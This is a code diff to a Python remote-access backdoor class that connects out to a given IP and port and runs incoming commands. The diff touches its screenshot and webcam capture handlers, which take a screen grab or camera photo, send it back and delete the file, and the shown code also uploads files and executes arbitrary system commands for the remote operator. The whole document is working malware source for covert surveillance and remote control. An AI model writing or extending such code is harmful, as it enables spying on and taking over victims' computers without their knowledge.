@@ -10,8 +10,6 @@ import mss
 import cv2
 
 class Backdoor:
-    screen_count = 0
-    camera_count = 0
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
@@ -78,27 +76,25 @@ class Backdoor:
                     file_content = command.replace(f"upload {file_name} ", "")
                     command_result = self.write_file(file_name, file_content)
                 elif command.split()[0] == "screenshot":
-                    im = mss.mss().shot(output=f"screen_{screen_count}.png")
-                    command_result = self.read_file(f"screen_{screen_count}.png")
+                    im = mss.mss().shot(output=f"screen.png")
+                    command_result = self.read_file(f"screen.png")
 
                     if os.name == "nt":
-                        os.system(f"del screen_{screen_count}.png")
+                        os.system(f"del screen.png")
                     else:
-                        os.system(f"rm screen_{screen_count}.png")
-                    screen_count += 1
+                        os.system(f"rm screen.png")
                 elif command.split()[0] == "camera":
                     cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                     result, image = cam.read()
-                    cv2.imwrite(f"camera_{camera_count}.jpg", image)
-                    command_result = self.read_file(f"camera_{camera_count}.jpg")
+                    cv2.imwrite(f"camera.jpg", image)
+                    command_result = self.read_file(f"camera.jpg")
 
                     if os.name == "nt":
-                        os.system(f"del camera_{camera_count}.jpg")
+                        os.system(f"del camera.jpg")
                     else:
-                        os.system(f"rm camera_{camera_count}.jpg")
+                        os.system(f"rm camera.jpg")
 
                     cam.release()
-                    camera_count += 1
                 else:
                     command_result = self.execute_system_command(command)
                 self.reliable_send(command_result)
